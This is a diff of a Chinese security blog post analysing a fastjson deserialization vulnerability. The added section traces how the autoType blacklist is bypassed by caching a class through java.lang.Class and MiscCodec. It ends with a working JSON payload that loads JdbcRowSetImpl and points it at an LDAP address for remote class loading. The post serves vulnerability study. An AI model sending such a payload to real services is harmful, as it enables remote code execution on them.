@@ -57,14 +57,14 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2022-10-20T17:08:27+08:00",
-        "dateModified": "2022-11-16T09:35:03+08:00",
+        "dateModified": "2022-11-16T16:23:14+08:00",
         "url": "https://klearcc.github.io/post/javasec_fastjson1.2.24/",
         "headline": "fastjson\u003c=1.2.4 反序列化漏洞分析",
         "description": "记录学习过程，强烈建议仅仅做参考。学习请……",
         "inLanguage" : "zh-CN",
         "articleSection": "post",
-        "wordCount":  3035 ,
-        "image": ["https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141104421.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141116976.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141145398.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141436419.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141432153.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141631595.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150836304.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150847088.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211151014721.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160902080.png"],
+        "wordCount":  4489 ,
+        "image": ["https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141104421.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141116976.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141145398.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141436419.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141432153.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141631595.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150836304.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150847088.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211151014721.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160902080.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160950806.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160953479.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957152.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957266.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161036742.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161108186.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161104279.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161111887.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161141759.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161152942.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161151984.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161200962.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161544633.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161548340.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161551905.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161552130.png","https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161614252.png"],
         "author": {
             "@type": "Person",
             "description": "失败的人爱bb",
@@ -109,7 +109,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141104421.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2022-10-20T17:08:27&#43;08:00" />
-    <meta property="article:modified_time" content="2022-11-16T09:35:03&#43;08:00" />
+    <meta property="article:modified_time" content="2022-11-16T16:23:14&#43;08:00" />
     
     <meta property="article:section" content="post" />
 
@@ -223,7 +223,7 @@
     
     
         
-        <time datetime="2022-11-16T09:35:03&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.11.16</time>
+        <time datetime="2022-11-16T16:23:14&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.11.16</time>
     
     
     
@@ -235,11 +235,11 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;3035</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;4489</span>
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;7&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;9&nbsp;分钟</span>
     
     
     
@@ -482,9 +482,116 @@ if (clazz != null) {
 这里出现了逻辑问题</p>
 <ol>
 <li>开启autoTypeSupport时：先匹配白名单，匹配到的话直接return clazz；如果没有匹配到则匹配黑名单，当匹配到黑名单并且mappings中没有这个类的缓存的话才会抛出异常。对比1.2.32的校验逻辑，只要匹配到黑名单就会抛出异常。因此1.2.25-1.2.32版本受autoTypeSupport的影响</li>
-<li>不开启autoTypeSupport时，直接匹配黑名单，匹配到的话抛出异常</li>
+<li>不开启autoTypeSupport时，直接匹配黑名单，匹配到的话抛出异常，后面代码不执行，所以要在判断前下功夫。</li>
 </ol>
+<p>判断没有开启autoTypeSupport前有三个if，怎样在这三步中将恶意类加载进去呢。
+deserializers：无法写入值，用不了。
+TypeUtils.getClassFromMapping(typeName)：
+从TypeUtils.mappings中取值，他是一个ConcurrentMap类型的对象
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160950806.png" alt="image-20221116095029750">
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160953479.png" alt="image-20221116095306438">
+能向mappings中赋值的方法
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957152.png" alt="image-20221116095709105">
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211160957266.png" alt="image-20221116095740236">
+其中，addBaseClassMappings()无入参，无法控制；看下loadclass：</p>
+<pre tabindex="0"><code>public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
+        if (className != null &amp;&amp; className.length() != 0) {
+            Class&lt;?&gt; clazz = (Class)mappings.get(className);
+            if (clazz != null) {
+                return clazz;
+            } else if (className.charAt(0) == &#39;[&#39;) {
+                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+                return Array.newInstance(componentType, 0).getClass();
+            } else if (className.startsWith(&#34;L&#34;) &amp;&amp; className.endsWith(&#34;;&#34;)) {
+                String newClassName = className.substring(1, className.length() - 1);
+                return loadClass(newClassName, classLoader);
+            ##如果clazz为空
+            } else {
+                try {
+                		##如果classLoader非空并且cache为true时，使用类加载器加载并缓存到mappings中
+                    if (classLoader != null) {
+                        clazz = classLoader.loadClass(className);
+                        if (cache) {
+                            mappings.put(className, clazz);
+                        }
 
+                        return clazz;
+                    }
+                } catch (Throwable var7) {
+                    var7.printStackTrace();
+                }
+								##如果失败或者没指定classLoader 并且cache为true的话，使用当前线程的contextClassLoader来加载并缓存到mappings中
+                try {
+                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+                    if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) {
+                        clazz = contextClassLoader.loadClass(className);
+                        if (cache) {
+                            mappings.put(className, clazz);
+                        }
+
+                        return clazz;
+                    }
+                } catch (Throwable var6) {
+                }
+								##如果还是失败的话，反射获取class对象并放入mappings中
+                try {
+                    clazz = Class.forName(className);
+                    mappings.put(className, clazz);
+                    return clazz;
+                } catch (Throwable var5) {
+                    return clazz;
+                }
+            }
+        } else {
+            return null;
+        }
+    }
+</code></pre><p>所以只要能控制这三个参数，就可以将任意类写入mappings。loadClass有三个重载方法
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161036742.png" alt="image-20221116103633697">
+找三个方法在哪里被调用，再看看能否被控制。(我的idea死活找不到调用情况，望提供建议，谢谢磕头了)
+最终定位到com.alibaba.fastjson.serializer.MiscCodec#deserialze.文件内定位loadClass，发现当strVal有值并且clazz为Class.class时才会进入if，然后类加载并缓存到mappings
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161108186.png" alt="image-20221116110811152">
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161104279.png" alt="image-20221116110440251">
+strVal值怎么获取的呢，原来是json解析val中的内容，然后向上转型成String
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161111887.png" alt="image-20221116111130847">
+原来是json解析val中的内容，然后向上转型成String。
+这样一条调用链就完整了，但如何进入if (parser.resolveStatus == 2) {}呢、。
+构造一条json调试试试</p>
+<pre tabindex="0"><code>String json = &#34;{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,&#34; +
+              &#34;\&#34;val\&#34;:\&#34;vulClass\&#34;}&#34;;
+</code></pre><p>调用parse进行json解析
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161141759.png" alt="image-20221116114102686">
+调用checkAutoType检查autoTypeSupport
+deserializers在初始化时会加载Class.class，所以用findClass会找到，然后return clazz。越过了下面的<code>if (!this.autoTypeSupport) {}</code>
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161152942.png" alt="image-20221116115241919">
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161151984.png" alt="image-20221116115130950">
+autoTypeSupport检测完后，现在clazz不为空，DedaultHSONParser#parseObject中设置setResolveStatus为2
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161200962.png" alt="image-20221116120032928">
+根据clazz类型分配deserialzer，Class类型由MiscCodec.deserialze()处理
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161544633.png" alt="image-20221116154433579">
+进去MiscCodec跟一下，json解析val中的内容并赋值给objVal
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161548340.png" alt="image-20221116154827313">
+将objVal转化为String类型并赋值给strVal
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161551905.png" alt="image-20221116155118881">
+判断clazz是否为Class.class，是的话加载strVal这个类并缓存到mappings
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161552130.png" alt="image-20221116155220106">
+现在恶意类已经被加载到mappings，再次用恶意类进行@type请求时就可以绕过。所以payload
+以上为第一个test解析过程;test2解析时很简单了,mappings中有了缓存，直接从缓存中getClass
+<img src="https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161614252.png" alt="image-20221116161423207">
+然后return clazz -&gt; setResolveStatus(2) -&gt; 根据clazz类型分配deserialzer ......参考之前版本的反序列化流程
+payload</p>
+<pre tabindex="0"><code>{
+    &#34;test&#34;: {
+        &#34;@type&#34;: &#34;java.lang.Class&#34;,
+        &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;
+    },
+    &#34;test2&#34;: {
+        &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;,
+        &#34;dataSourceName&#34;: &#34;ldap://127.0.0.1:1389/VulClass&#34;,
+        &#34;autoCommit&#34;: true
+    }
+}
+</code></pre>
             </div>
 
             
@@ -512,7 +619,7 @@ if (clazz != null) {
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-11-16 09:35:03 CST" style="cursor:help">
+        <span title="Updated @ 2022-11-16 16:23:14 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-11-16</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-11-16</text></g></svg>
         </span></div>
